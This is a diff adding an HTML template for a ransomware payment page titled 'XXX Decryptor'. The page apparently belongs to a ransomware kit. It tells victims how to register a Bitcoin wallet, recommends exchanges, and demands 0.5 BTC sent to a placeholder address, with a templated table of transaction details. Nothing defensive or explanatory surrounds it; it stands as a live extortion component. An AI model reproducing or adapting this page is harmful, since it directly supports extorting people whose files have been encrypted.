@@ -1,0 +1,58 @@
+<!doctype html>
+<html lang="en">
+<head>
+<title>XXX Decryptor</title>
+<style>
+</style>
+</head>
+<body>
+<h1>XXX Decryptor</h1>
+<div>We present a special software <b>XXX Decryptor</b> -<br/>
+which allows to decrypt and return control to all your files.<div>
+<br/>
+<h2>How to buy XXX Decryptor?<h2>
+<div>
+<ol>
+<li><h3>You can make a payment wiht BitCoins, there are many methods to get them.</h3></li>
+<li><h3>You should register BitCoin wallet:<h3>
+<div><a href="https://www.coinbase.com">Simplest online wallet</a> or <a href="https://bitcoin.org/en/choose-your-wallet">Some other methods of creation wallet</div>
+</li>
+<li><h3>Purchasing Bitcoins, although it's not yet easy to buy bitcoins, it's getting simpler every day.</h3>
+<div><span class="n">Here our recommendations:</span>
+
+<div class="b">
+<div class="l"><a href="https://coincafe.com">coincafe.com</a></div>
+<div class="r">Recommended for fast, simple service.<br/>
+Payment Methods: Western Union, Bank of America, Cash by FedEx, Moneygram, Money Order.</div>
+</div>
+
+<div class="b">
+<div class="l"><a href="https://localbitcoins.com">localbitcoins</a></div>
+<div class="r">Service allows you to search for people in your community willing to sel bitcoins to you directly.</div>
+</div>
+
+<div class="b">
+<div class="l"><a href="https://btcdirect.eu">btcdirect</a></div>
+<div class="r">The best for Europe.</div>
+</div>
+
+</div>
+</li>
+<li><h3>Send 0.5 BTC to Bitcoin address:<h3>
+<div>
+<div>
+<input type="text" value="{{bitcoin_address}}" />
+<span class="n">Note: Payment pending up to 30 mins or more for transaction confirmation, please be patient...</span>
+</div>
+<table>
+<tr><th>Date</th><th>Amount BTC</th><th>Transaction ID</th>Confirmations<tr>
+<tr><th>{{date}}</th><th>{{amount}}</th><th>{{tr_id}}</th>{{conf}}<tr>
+<tr class="ti">Not found</tr>
+</table>
+</div>
+</li>
+</ol>
+</div>
+</body>
+</html>
+
